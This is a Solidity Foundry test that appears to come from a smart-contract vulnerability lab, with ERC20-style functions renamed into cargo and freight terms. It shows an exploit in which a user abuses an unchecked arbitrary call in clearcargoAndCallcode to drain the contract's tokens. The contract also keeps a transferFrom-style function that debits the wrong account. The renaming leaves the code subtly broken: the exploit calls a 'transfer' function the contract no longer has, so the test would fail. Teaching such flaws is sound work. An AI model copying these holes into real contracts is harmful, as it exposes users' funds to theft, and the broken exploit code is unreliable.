// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    FreightcreditWhale FreightcreditWhaleContract;

    function testAltCall() public {
        address alice = vm.addr(1);
        FreightcreditWhaleContract = new FreightcreditWhale();
        FreightcreditWhaleContract.CargotokenWhaleDeploy(address(FreightcreditWhaleContract));
        console.log(
            "TokenWhale balance:",
            FreightcreditWhaleContract.cargocountOf(address(FreightcreditWhaleContract))
        );

        // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000);

        console.log(
            "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
        );
        vm.prank(alice);
        FreightcreditWhaleContract.clearcargoAndCallcode(
            address(FreightcreditWhaleContract),
            0x1337,
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                address(alice),
                1000
            )
        );

        assertEq(FreightcreditWhaleContract.cargocountOf(address(alice)), 1000);
        console.log("operate completed");
        console.log(
            "TokenWhale balance:",
            FreightcreditWhaleContract.cargocountOf(address(FreightcreditWhaleContract))
        );
        console.log(
            "Alice balance:",
            FreightcreditWhaleContract.cargocountOf(address(alice))
        );
    }

    receive() external payable {}
}

contract FreightcreditWhale {
    address player;

    uint256 public totalGoods;
    mapping(address => uint256) public cargocountOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function CargotokenWhaleDeploy(address _player) public {
        player = _player;
        totalGoods = 1000;
        cargocountOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return cargocountOf[player] >= 1000000; // 1 mil
    }

    event RelocateCargo(address indexed from, address indexed to, uint256 value);

    function _movegoods(address to, uint256 value) internal {
        cargocountOf[msg.sender] -= value;
        cargocountOf[to] += value;

        emit RelocateCargo(msg.sender, to, value);
    }

    function moveGoods(address to, uint256 value) public {
        require(cargocountOf[msg.sender] >= value);
        require(cargocountOf[to] + value >= cargocountOf[to]);

        _movegoods(to, value);
    }

    event Approval(
        address indexed warehouseManager,
        address indexed spender,
        uint256 value
    );

    function permitRelease(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function relocatecargoFrom(address from, address to, uint256 value) public {
        require(cargocountOf[from] >= value);
        require(cargocountOf[to] + value >= cargocountOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _movegoods(to, value);
    }

    /* Approves and then calls the contract code*/

    function clearcargoAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraData
    ) public {
        allowance[msg.sender][_spender] = _value;

        bool success;

        (success, ) = _spender.call(_extraData);
        console.log("success:", success);
    }
}
